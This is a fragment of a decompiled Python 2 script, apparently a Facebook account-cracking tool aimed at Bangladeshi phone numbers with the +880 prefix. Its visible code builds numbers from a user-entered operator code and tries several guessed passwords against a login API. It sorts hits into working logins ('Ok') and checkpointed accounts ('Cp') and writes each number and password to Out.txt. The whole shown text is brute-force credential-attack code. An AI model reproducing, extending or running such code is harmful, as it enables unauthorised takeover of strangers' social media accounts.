...
# Embedded file name: /sdcard/RozhakXD/c_n_b.py
# Compiled at: 2021-07-02 12:56:26
...
def c_n_b():
    ...
    try:
        k = '+880'
        print '\x1b[0;92m191\x1b[0;93m-\x1b[0;92m192\x1b[0;93m-\x1b[0;92m193\x1b[0;93m-\x1b[0;92m194\x1b[0;93m-\x1b[0;92m195\x1b[0;93m-\x1b[0;92m196\x1b[0;93m-\x1b[0;92m197\x1b[0;93m-\x1b[0;92m198\x1b[0;93m-\x1b[0;92m199'
        c = raw_input('\x1b[0;93m[\x1b[0;92m?\x1b[0;93m]\x1b[0;92m Kode\x1b[0;93m :\x1b[0;97m ')
        idlist = '.txt'
    ...
    xxx = str(len(id))
    jalan('\x1b[0;93m[\x1b[0;92m\xe2\x9c\x94\x1b[0;93m] \x1b[0;92mTotal Nomor \x1b[0;93m:\x1b[0;97m ' + xxx)
    time.sleep(1)
    os.system('echo -e "[\xe2\x9c\x94] Hasil Ok/Cp Tersimpan Di (Out.txt)" | lolcat')
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in w:
                print '\x1b[0;92m[Ok] ' + k + c + user + ' \x1b[0;91m\xe2\x97\x8f\x1b[0;92m ' + pass1
                okb = open('Out.txt', 'a')
                okb.write('[Ok] ' + k + c + user + ' \xe2\x97\x8f ' + pass1 + '\n')
                okb.close()
                oks.append(user + pass1)
            elif 'www.facebook.com' in w['error_msg']:
                print '\x1b[0;93m[Cp] ' + k + c + user + ' \x1b[0;91m\xe2\x97\x8f\x1b[0;93m ' + pass1
                cps = open('Out.txt', 'a')
                cps.write('[Cp] ' + k + c + user + ' \xe2\x97\x8f ' + pass1 + '\n')
                cps.close()
                ...
                w = json.load(data)
                if 'access_token' in w:
                    print '\x1b[0;92m[Ok] ' + k + c + user + ' \x1b[0;91m\xe2\x97\x8f\x1b[0;92m ' + pass2
                    okb = open('Out.txt', 'a')
                    okb.write('[Ok] ' + k + c + user + ' \xe2\x97\x8f ' + pass2 + '\n')
                    okb.close()
                    oks.append(user + pass2)
                elif 'www.facebook.com' in w['error_msg']:
                    print '\x1b[0;93m[Cp] ' + k + c + user + ' \x1b[0;91m\xe2\x97\x8f\x1b[0;93m ' + pass2
                    cps = open('Out.txt', 'a')
                    cps.write('[Cp] ' + k + c + user + ' \xe2\x97\x8f ' + pass2 + '\n')
                    cps.close()
                    ...
                    w = json.load(data)
                    if 'access_token' in w:
                        print '\x1b[0;92m[Ok] ' + k + c + user + ' \x1b[0;91m\xe2\x97\x8f\x1b[0;92m ' + pass3
                        okb = open('Out.txt', 'a')
                        okb.write('[Ok] ' + k + c + user + ' \xe2\x97\x8f ' + pass3 + '\n')
                        okb.close()
                        oks.append(user + pass3)
                    elif 'www.facebook.com' in w['error_msg']:
                        print '\x1b[0;93m[Cp] ' + k + c + user + ' \x1b[0;91m\xe2\x97\x8f\x1b[0;93m ' + pass3
                        cps = open('Out.txt', 'a')
                        cps.write('[Cp] ' + k + c + user + ' \xe2\x97\x8f ' + pass3 + '\n')
                        cps.close()
